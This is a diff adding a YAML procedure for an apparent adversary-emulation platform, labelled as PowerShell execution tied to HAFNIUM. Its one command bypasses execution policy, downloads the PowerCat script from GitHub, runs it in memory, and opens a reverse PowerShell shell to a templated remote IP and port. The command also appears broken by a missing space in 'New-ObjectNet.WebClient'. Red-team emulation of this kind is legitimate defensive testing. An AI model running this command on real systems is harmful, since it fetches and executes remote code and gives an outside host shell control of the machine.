@@ -1,0 +1,19 @@
+id: 1ccc757b-cd16-4f62-bf06-91019a9bed44
+name: Execute PowerShell remotely with PowerCat
+description: 'This procedure downloads PowerCat from Github, then uses it to open a connection to a remote server.'
+tactic: execution
+technique:
+  id: T1059.001
+  name: PowerShell
+platforms:
+  windows:
+    psh:
+      command: 'powershell.exe -exec bypass -C "IEX (New-ObjectNet.WebClient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1''); powercat -c #{execution.remote.ip} -p #{execution.remote.port} -e powershell"'
+metadata:
+  authors:
+    - bfuzzy1
+  tags:
+    - HAFNIUM
+  version: 1
+  source: Operator
+  enabled: true
